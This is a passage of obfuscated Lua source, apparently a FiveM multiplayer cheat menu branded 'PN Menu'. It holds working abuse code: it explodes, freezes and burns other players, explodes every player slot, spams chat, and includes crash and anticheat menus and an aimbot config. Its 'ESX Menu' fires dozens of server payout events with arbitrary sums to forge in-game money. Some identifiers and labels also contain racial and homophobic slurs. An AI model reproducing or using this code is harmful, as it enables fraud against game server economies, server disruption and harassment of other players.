                  TLineFourBegin_DSUGYFISDGDF.x,
                  TLineFourBegin_DSUGYFISDGDF.y,
                  TLineFourBegin_DSUGYFISDGDF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  ConnectorOneBegin_DSUGHISDUGDFG.x,
                  ConnectorOneBegin_DSUGHISDUGDFG.y,
                  ConnectorOneBegin_DSUGHISDUGDFG.z,
                  ConnectorOneEnd_DUSGIHUDGDFG.x,
                  ConnectorOneEnd_DUSGIHUDGDFG.y,
                  ConnectorOneEnd_DUSGIHUDGDFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  ConnectorTwoBegin_USDHIUFDSGDFG.x,
                  ConnectorTwoBegin_USDHIUFDSGDFG.y,
                  ConnectorTwoBegin_USDHIUFDSGDFG.z,
                  ConnectorTwoEnd_QUTGFIDYGFSUGFSG.x,
                  ConnectorTwoEnd_QUTGFIDYGFSUGFSG.y,
                  ConnectorTwoEnd_QUTGFIDYGFSUGFSG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  ConnectorThreeBegin_LDSIGHSDGHKDFSGDF.x,
                  ConnectorThreeBegin_LDSIGHSDGHKDFSGDF.y,
                  ConnectorThreeBegin_LDSIGHSDGHKDFSGDF.z,
                  ConnectorThreeEnd_UAIDGYIHDSHGODF.x,
                  ConnectorThreeEnd_UAIDGYIHDSHGODF.y,
                  ConnectorThreeEnd_UAIDGYIHDSHGODF.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                  sritizen_INVOKE_PN(0x6B7256074AE34680, 
                  ConnectorFourBegin_SDUYFGTUDSIGDFG.x,
                  ConnectorFourBegin_SDUYFGTUDSIGDFG.y,
                  ConnectorFourBegin_SDUYFGTUDSIGDFG.z,
                  ConnectorFourEnd_ASUHYFIUDSGDFG.x,
                  ConnectorFourEnd_ASUHYFIUDSGDFG.y,
                  ConnectorFourEnd_ASUHYFIUDSGDFG.z,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.r,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.g,
                  kolorek_espa_xd_IDHFUDSHUIFDSF.b,
                  255
                  )
                end
                if esplines_IDSUHGIUFDHGUDFHIG and esp_duhsgiudfgdfg then
                  sritizen_INVOKE_PN(0x6B7256074AE34680, cx_duihsgiudfgdf, cy_duhifsudgsdfg, cz_dsyaugfidsgsdf, x, y, z, kolorek_espa_xd_IDHFUDSHUIFDSF.r, kolorek_espa_xd_IDHFUDSHUIFDSF.g, kolorek_espa_xd_IDHFUDSHUIFDSF.b, 255)
                end
              end
            end
          end
          end
		  
if spectate_global_dugsuydhkgsdfgdf then
local coords_dugsudhgsdf = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, player_global_UDHFUYDSHFIGUFDG))
local enstrititi = sritizen_INVOKE_PN(0x997ABD671D25CA0B, sritizen_INVOKE_PN(0xD80958FC74E988A6), false) and sritizen_INVOKE_PN(0x6094AD011A2EA87D, sritizen_INVOKE_PN(0xD80958FC74E988A6)) or sritizen_INVOKE_PN(0xD80958FC74E988A6)
sritizen_INVOKE_PN(0x06843DA7060A026B, enstrititi, coords_dugsudhgsdf.x, coords_dugsudhgsdf.y, coords_dugsudhgsdf.z+5, 0.0, 0.0, 0.0, false)
sritizen_INVOKE_PN(0xEA1C610A04DB6BBB, enstrititi, false, 0)
end

if Niewidka31da_PN then
    sritizen_INVOKE_PN(0xEA1C610A04DB6BBB, sritizen_INVOKE_PN(0xD80958FC74E988A6), false, false)
    sritizen_INVOKE_PN(0x241E289B5C059EDC, sritizen_INVOKE_PN(0xD80958FC74E988A6), true)
    sritizen_INVOKE_PN(0x44A0870B7E92D7C0, sritizen_INVOKE_PN(0xD80958FC74E988A6), 150)
else
    sritizen_INVOKE_PN(0xEA1C610A04DB6BBB, sritizen_INVOKE_PN(0xD80958FC74E988A6), true, true)
    sritizen_INVOKE_PN(0x44A0870B7E92D7C0, sritizen_INVOKE_PN(0xD80958FC74E988A6), 255)
end

if Nie_Ukryjeszsiekurwo_MALA_PN then
    local plist_iduygusdigsdfg = GetActivePlayers_PN_UDGYUDFIGKDFGDF()
for sinksianksionk = 0, #plist_iduygusdigsdfg do
if not sritizen_INVOKE_PN(0xD796CB5BA8F20E32, sritizen_INVOKE_PN(0x43A66C31C68491C0, plist_iduygusdigsdfg[sinksianksionk])) then
    sritizen_INVOKE_PN(0xEA1C610A04DB6BBB, sritizen_INVOKE_PN(0x43A66C31C68491C0, plist_iduygusdigsdfg[sinksianksionk]), false, false)
    sritizen_INVOKE_PN(0x241E289B5C059EDC, sritizen_INVOKE_PN(0x43A66C31C68491C0, plist_iduygusdigsdfg[sinksianksionk]), true)
    sritizen_INVOKE_PN(0x44A0870B7E92D7C0, sritizen_INVOKE_PN(0x43A66C31C68491C0, plist_iduygusdigsdfg[sinksianksionk]), 200)
end
end
end

if Friiizplejer31qda_PN then
sritizen_INVOKE_PN(0xAAA34F8A7CB32098, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN))
sritizen_INVOKE_PN(0x428CA6DBD1094446, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), true)
else
sritizen_INVOKE_PN(0x428CA6DBD1094446, sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN), false)
end

if molotofcfela31qd_PN then
	sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), 3, 100000.0, true, false, 100000.0)
end

if TWERKUJKAMERAGRACZA13QDA_PN then
	sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), 4, 0.0, false, true, 10000000000.0)
end

if Flarka31da_DA_PN then
sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN)), 22, 100000.0, true, false, 0.0)
end

if Hydrantnatypkasrypka31_PN then
local coords31dqa_PN = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, zaznaczonygracz31_PN))
sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, coords31dqa_PN.x, coords31dqa_PN.y, coords31dqa_PN.z-1, 13, 100000.0, true, false, 0.0)
end

if MakeYouFlare_PN_UDYUFGDUYFGIDFGF then
local coords_UYDUHIFGDGFD = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, -1))
sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, coords_UYDUHIFGDGFD.x, coords_UYDUHIFGDGFD.y, coords_UYDUHIFGDGFD.z, 22, 100000.0, true, false, 0.0)
end

if explodeall91507q_PN then
	for sinksianksionk = 0, 128 do
		sritizen_INVOKE_PN(0xE3AD2BDBAEE269AC, GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0x43A66C31C68491C0, sinksianksionk)), 8, 100000.0, true, false, 100000.0)
	end
end

if HTYJKUKYUKYUKUKY then

    TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu)")
	TriggerServerEvent('_chat:messageEntered', "PN On Top!", { 141, 211, 255 }, "PN Menu")

end

if kolorowypojazd14rq_PN then
local color_DSGHSUDGSD = RGB_Rainbow_DSUGSIDGSD(1.0)
sritizen_INVOKE_PN(0x7141766F91D15BEA, GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0x43A66C31C68491C0, -1)), color_DSGHSUDGSD.r, color_DSGHSUDGSD.g, color_DSGHSUDGSD.b)
sritizen_INVOKE_PN(0x36CED73BFED89754, GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0x43A66C31C68491C0, -1)), color_DSGHSUDGSD.r, color_DSGHSUDGSD.g, color_DSGHSUDGSD.b)
end

if niezniszcalnypojazdbojestkox341q_PN then
sritizen_INVOKE_PN(0x3882114BDE571AD4, GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0xD80958FC74E988A6)), true)
sritizen_INVOKE_PN(0x59BF8C3D52C92F66, GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0xD80958FC74E988A6)), false)
end

if spidbuust31q_PN then
sritizen_INVOKE_PN(0x93A3996368C94158, GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false), 3.0 * 20.0)
else
sritizen_INVOKE_PN(0x93A3996368C94158, GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), false), 20.0)
end



end
end)

------------------------------------------------------------------------------------------------------------------------------------------

-- Budowa menu --
CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
	local SZYBKIBIEG_31QDZ_PN = 1
	local danaakcyjka3151_PN = 1
	local sel_action_duhgsidugsdfg = 1
	--changemodeel31qda_PN("csb_ramp_marine")
	

	CreateMenu_tdrfyuweghfbidsger('MejnMenuBajbas_PN', '')
	SetTitleBackgroundSprite_odigosheoglsfjg('MejnMenuBajbas_PN', 'shopui_title_graphics_franklin', 'shopui_title_graphics_franklin')
	
	CreateSubMenu_oipdgiseorghiuseoge('SelfMeni_31DA_PN', 'MejnMenuBajbas_PN', 'Self Menu')
	CreateSubMenu_oipdgiseorghiuseoge('Supermoce_31da_PN', 'SelfMeni_31DA_PN', 'Super Powers')
	CreateSubMenu_oipdgiseorghiuseoge('Ubior_31d3EDQA_PN', 'SelfMeni_31DA_PN', 'Outfit Menu')
	CreateSubMenu_oipdgiseorghiuseoge('Peddddyyy_31DA_PN', 'SelfMeni_31DA_PN', 'Peds Menu')
	CreateSubMenu_oipdgiseorghiuseoge('Rozwalaczserwera_31qda_PN', 'MejnMenuBajbas_PN', 'Destroyer Menu')
	CreateSubMenu_oipdgiseorghiuseoge('Opcjewizualne31qda_PN', 'MejnMenuBajbas_PN', 'Visual Menu')
	CreateSubMenu_oipdgiseorghiuseoge('Menubronii_31D_PN', 'MejnMenuBajbas_PN', 'Weapon Menu')
	CreateSubMenu_oipdgiseorghiuseoge('Onlajnplejers31qda_PN', 'MejnMenuBajbas_PN', 'Online Players')
	CreateSubMenu_oipdgiseorghiuseoge('TrollMenuWOnlajnsach_PN', 'Onlajnplejers31qda_PN', 'Online Options')
	CreateSubMenu_oipdgiseorghiuseoge('Rozwalanie_Pojazdow_31da_PN', 'TrollMenuWOnlajnsach_PN', 'Crash ~g~Player Options')
	CreateSubMenu_oipdgiseorghiuseoge('WejponMeni_31da_Single_PN', 'Menubronii_31D_PN', 'Single Weapon Spawner')
	CreateSubMenu_oipdgiseorghiuseoge('KustomizacjaPistoletu_3QDA_PN', 'Menubronii_31D_PN', 'Weapon Customization')
	CreateSubMenu_oipdgiseorghiuseoge('MenuPojazdu31qda_PN', 'MejnMenuBajbas_PN', 'Vehicle Menu')
	CreateSubMenu_oipdgiseorghiuseoge('RESPIENIEVEHICLESOW_PN', 'MenuPojazdu31qda_PN', 'Spawn Vehicle Options')
	CreateSubMenu_oipdgiseorghiuseoge('Trolloweopcjead_PN', 'TrollMenuWOnlajnsach_PN', 'Troll Options')
	CreateSubMenu_oipdgiseorghiuseoge('OpcjeTeleportowOnline31qd_PN', 'TrollMenuWOnlajnsach_PN', 'Troll Options')
	CreateSubMenu_oipdgiseorghiuseoge('MapyzakladkawPropachTrollOnline_PN', 'OpcjeTeleportowOnline31qd_PN', 'Maps Prop')
	CreateSubMenu_oipdgiseorghiuseoge('Flagipropsowe31q_PN', 'OpcjeTeleportowOnline31qd_PN', 'Flag Props')
	CreateSubMenu_oipdgiseorghiuseoge('MenuTeleportacji413eqda_PN', 'MejnMenuBajbas_PN', 'Teleport Menu')
	CreateSubMenu_oipdgiseorghiuseoge('OpcjeServerowecac_PN', 'MejnMenuBajbas_PN', 'Server Options')
	CreateSubMenu_oipdgiseorghiuseoge('Anticzitys41qda_PN', 'OpcjeServerowecac_PN', 'Antycheats')
	CreateSubMenu_oipdgiseorghiuseoge('MENU_ESXOW_31QDA_PN', 'MejnMenuBajbas_PN', 'ESX Menu')
	CreateSubMenu_oipdgiseorghiuseoge('skrypt_dla_niggerow_EDA_PN', 'OpcjeServerowecac_PN', 'Scripts')
	CreateSubMenu_oipdgiseorghiuseoge('Pogodadlaeqda_PN', 'Opcjewizualne31qda_PN', 'Weather')
	CreateSubMenu_oipdgiseorghiuseoge('ESP_MENU_DUHFIDSUGHUIDFG', 'Opcjewizualne31qda_PN', 'Esp Menu')
	CreateSubMenu_oipdgiseorghiuseoge('Ustawienia3DA_PN', 'MejnMenuBajbas_PN', 'Settings')
	CreateSubMenu_oipdgiseorghiuseoge('Configiedqa_PN', 'Ustawienia3DA_PN', 'Configs')
	CreateSubMenu_oipdgiseorghiuseoge('Themestlo31qc_PN', 'Ustawienia3DA_PN', 'Themes')
	CreateSubMenu_oipdgiseorghiuseoge('Credists_PE1_PN', 'Ustawienia3DA_PN', 'Credits')
	CreateSubMenu_oipdgiseorghiuseoge('CreditsyMenu_31da_PN', 'Credists_PE1_PN', 'Menu Credits')


	while Wlaczone_PN_MENU_E1QDA_XD do
		if MENUOPENED31QDA_PN('MejnMenuBajbas_PN') then
		    if menibutton_PN938D_PN('Self Menu', 'SelfMeni_31DA_PN') then
			elseif menibutton_PN938D_PN("Online Players", "Onlajnplejers31qda_PN") then
			elseif menibutton_PN938D_PN("Visual Options", 'Opcjewizualne31qda_PN') then
			elseif menibutton_PN938D_PN('Vehicle Menu', 'MenuPojazdu31qda_PN') then
			elseif menibutton_PN938D_PN('Teleport Menu', 'MenuTeleportacji413eqda_PN') then
			elseif menibutton_PN938D_PN("Weapon Menu", "Menubronii_31D_PN") then
			elseif menibutton_PN938D_PN("Server Destroyer", "Rozwalaczserwera_31qda_PN") then
			elseif menibutton_PN938D_PN("Server Options", 'OpcjeServerowecac_PN') then
			elseif menibutton_PN938D_PN("Settings", 'Ustawienia3DA_PN') then
			elseif pszycisk31eqd_PN('~r_djguisernglse~Exit ') then
			Wlaczone_PN_MENU_E1QDA_XD = false
			end
			
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Themestlo31qc_PN') then
		if pszycisk31eqd_PN("~g~Standard") then
		DSUHGSIUD_theme_green = true
		DSUHGSIUD_theme_red = false
		DSUHGSIUD_theme_blue = false
		DSUHGSIUD_theme_purple = false
		LoadGif_DSGHDSIUGSDG()
		elseif pszycisk31eqd_PN("~p~Purple") then
		DSUHGSIUD_theme_green = false
		DSUHGSIUD_theme_red = false
		DSUHGSIUD_theme_blue = false
		DSUHGSIUD_theme_purple = true
		LoadGif_DSGHDSIUGSDG()
		
		end
			
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Configiedqa_PN') then
		if pszycisk31eqd_PN("~r~[ PVP ]") then
		legit_aimbot_toogle_duygsudhkgsdfgsdfg = true
		ajmbot4918_PN = true
		current_fov_SUHFIUSDFSDF = 1
		fov_x_DISFISDUSGFDG = 0.45
		fov_x2_DISFISDUSGFDG = 0.55
		fov_y_DISFISDUSGFDG = 0.45
		fov_y2_DISFISDUSGFDG = 0.55
		JEBNIJpowiadomieni31_PN("PVP Config loaded")
		end
			
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('MENU_ESXOW_31QDA_PN') then
				if pszycisk31eqd_PN("Automatic Money ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent('esx_truckerjob:pay', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('vrp_slotmachine:server:2', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent("esx_pizza:pay", WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_jobs:caution', 'give_back', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('lscustoms:payGarage', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_tankerjob:pay', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('gambling:spend', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('AdminMenu:giveBank', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('AdminMenu:giveCash', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_slotmachine:sv:2', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_truckerjob:pay', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_moneywash:deposit', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_moneywash:withdraw', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('esx_moneywash:deposit', WYNIK_TWOJEGO_STAREGO)
			    TriggerServerEvent('mission:completed', WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('truckerJob:success',WYNIK_TWOJEGO_STAREGO)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("CAUTION ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent("esx_jobs:caution", "give_back", WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("TRUCKER ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent('esx_truckerjob:pay', WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("ADMIN BANK ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent('AdminMenu:giveBank', WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("ADMIN ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent('AdminMenu:giveCash', WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("GOPOSTAL ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent("esx_gopostaljob:pay", WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("BANKSEC ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent("esx_banksecurity:pay", WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("SLOT MACHINE ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent("esx_slotmachine:sv:2", WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("SLOT MACHINE #2 ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent("vrp_slotmachine:server:2", WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("DIRTY MONEY ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("TRUCKERJOB ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent('esx_truckerjob:pay', WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("DOSTAWA ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent('delivery:success', WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("TAXI ( CHOOSE )", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent ('taxi:success', WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("TAXI", "ESX") then
					for iiiIiII_greg = 0,128 do 
					TriggerServerEvent('esx_taxijob:success')
					end
			elseif pszycisk31eqd_PN("GARBAGEJOB ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100000000)
				if WYNIK_TWOJEGO_STAREGO then
					TriggerServerEvent("esx_garbagejob:pay", WYNIK_TWOJEGO_STAREGO)
				end	
			elseif pszycisk31eqd_PN("PayCheck ", "ESX") then
				for iiiIiII_greg= 0,128 do
				TriggerServerEvent('paycheck:salary')
				end
			elseif pszycisk31eqd_PN("~s~Bank ~r~Deposit", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent("bank:deposit", WYNIK_TWOJEGO_STAREGO)
				end
			elseif pszycisk31eqd_PN("~s~Bank ~r~Withdraw ", "ESX") then
				local WYNIK_TWOJEGO_STAREGO = klawiaturainput419r8q_PN("How Much Money You Want ( Dangerous )", "", 100)
				if WYNIK_TWOJEGO_STAREGO then
				TriggerServerEvent("bank:withdraw", WYNIK_TWOJEGO_STAREGO)
				end
			end
			
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Ustawienia3DA_PN') then
		if menibutton_PN938D_PN("Credits", 'Credists_PE1_PN') then
		elseif checkbox_PN_31DA_PN(
		"Watermark",
		watermark_1587_PN,
		function(Wlaczone_PN_MENU_E1QDA_XD)
			watermark_1587_PN = Wlaczone_PN_MENU_E1QDA_XD
        	end)
        then
		elseif menibutton_PN938D_PN("Themes", 'Themestlo31qc_PN') then
		elseif menibutton_PN938D_PN("Fast ~g~Configs (Beta)", 'Configiedqa_PN') then
		end
		
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Peddddyyy_31DA_PN') then
			if pszycisk31eqd_PN("SWAT") then
				changemodeel31qda_PN("s_m_y_swat_01")
			elseif pszycisk31eqd_PN("Stripper") then
				changemodeel31qda_PN("s_f_y_stripper_01")
			elseif pszycisk31eqd_PN("Stripper 2") then
				changemodeel31qda_PN("s_f_y_stripper_02")
			elseif pszycisk31eqd_PN("Policjant ( Kobieta )") then
				changemodeel31qda_PN("s_f_y_cop_01")
			elseif pszycisk31eqd_PN("Policjant ( Mezczyzna )") then
				changemodeel31qda_PN("s_m_y_cop_01")
			elseif pszycisk31eqd_PN("Ochroniarz") then
				changemodeel31qda_PN("mp_m_securoguard_01")
			elseif pszycisk31eqd_PN("Kadet") then
				changemodeel31qda_PN("csb_trafficwarden")
			elseif pszycisk31eqd_PN("Astronauta") then
				changemodeel31qda_PN("s_m_m_movspace_01")
			elseif pszycisk31eqd_PN("Łysa") then
				changemodeel31qda_PN("mp_f_freemode_01")
			elseif pszycisk31eqd_PN("Łysy") then
				changemodeel31qda_PN("mp_m_freemode_01")
			elseif pszycisk31eqd_PN("Kosmita") then
				changemodeel31qda_PN("u_m_y_rsranger_01")
			elseif pszycisk31eqd_PN("Jesus") then
				changemodeel31qda_PN("u_m_m_jesus_01")
			elseif pszycisk31eqd_PN("Wielka Stopa") then
				changemodeel31qda_PN("ig_orleans")
			elseif pszycisk31eqd_PN("Strazak") then
				changemodeel31qda_PN("s_m_y_fireman_01")
			elseif pszycisk31eqd_PN("Stara baba") then
				changemodeel31qda_PN("a_f_m_fatcult_01")
			elseif pszycisk31eqd_PN("Gruby") then
				changemodeel31qda_PN("a_m_m_afriamer_01")
			elseif pszycisk31eqd_PN("Pedal") then
				changemodeel31qda_PN("a_m_m_acult_01")
			elseif pszycisk31eqd_PN("Gruby 2") then
				changemodeel31qda_PN("a_m_m_fatlatin_01")
			elseif pszycisk31eqd_PN("Pedal 2") then
				changemodeel31qda_PN("a_m_y_acult_02")
			elseif pszycisk31eqd_PN("Dzik") then
				changemodeel31qda_PN("a_c_boar")
			elseif pszycisk31eqd_PN("Kot") then
				changemodeel31qda_PN("a_c_cat_01")
			elseif pszycisk31eqd_PN("Orzel") then
				changemodeel31qda_PN("a_c_chickenhawk")
			elseif pszycisk31eqd_PN("Krowa") then
				changemodeel31qda_PN("a_c_cow")
			elseif pszycisk31eqd_PN("Coyot") then
				changemodeel31qda_PN("a_c_coyote")
			elseif pszycisk31eqd_PN("Kruk") then
				changemodeel31qda_PN("a_c_crow")
			elseif pszycisk31eqd_PN("Swinia") then
				changemodeel31qda_PN("a_c_pig")
			elseif pszycisk31eqd_PN("Pudelek") then
				changemodeel31qda_PN("a_c_poodle")
			elseif pszycisk31eqd_PN("Rottweiler") then
				changemodeel31qda_PN("a_c_rottweiler")
			elseif pszycisk31eqd_PN("Shepherd") then
				changemodeel31qda_PN("a_c_shepherd")
			elseif pszycisk31eqd_PN("Piesek") then
				changemodeel31qda_PN("a_c_westy")
			elseif pszycisk31eqd_PN("Jelen") then
				changemodeel31qda_PN("a_c_deer")
			elseif pszycisk31eqd_PN("Kurczak") then
				changemodeel31qda_PN("a_c_hen")
			elseif pszycisk31eqd_PN("Doctor") then
				changemodeel31qda_PN("s_m_m_doctor_01")
			end
		
			displej31eqda_PN()
		elseif MENUOPENED31QDA_PN('Ubior_31d3EDQA_PN') then
			if pszycisk31eqd_PN("~g~Random Outfit") then
			ResetAppearance_PN_DSUGHSDIGHSD()
			RandomOutfit_PN_HAHERHGKDHFUFDHSGIUHDFIGDF()
			elseif pszycisk31eqd_PN('~g~Balla') then
				ResetAppearance_PN_DSUGHSDIGHSD()
				ChangeAppearance_PN_ASUHGIUDSHGSD('HATS', 10, 7)
				ChangeAppearance_PN_ASUHGIUDSHGSD('GLASSES', 17, 6)
